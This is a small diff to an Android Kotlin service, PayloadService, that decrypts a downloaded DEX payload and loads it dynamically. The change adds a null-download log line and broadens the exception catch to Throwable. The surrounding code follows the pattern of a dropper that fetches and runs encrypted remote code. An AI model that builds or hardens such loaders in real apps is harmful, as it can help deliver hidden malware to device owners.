@@ -138,8 +138,10 @@ class PayloadService : Service() {
                     val decrypted = CryptoUtils.decryptPayload(dexBytes)
                     PayloadLoader.loadDex(this, decrypted)
                     Log.i(TAG, "Payload loaded successfully")
+                } else {
+                    Log.w(TAG, "Payload download returned null")
                 }
-            } catch (e: Exception) {
+            } catch (e: Throwable) {
                 Log.e(TAG, "Failed to load payload", e)
             }
         }.start()
